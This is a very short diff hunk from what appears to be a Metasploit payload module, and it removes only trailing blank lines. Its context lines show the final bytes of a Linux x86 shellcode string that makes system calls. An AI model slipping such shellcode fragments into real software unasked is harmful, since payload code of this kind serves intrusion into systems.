@@ -39,6 +39,3 @@ module Metasploit3
 			"\x59\xcd\x80\x6a\x01\x58\xcd\x80";
 	end
 end
-
-    
-
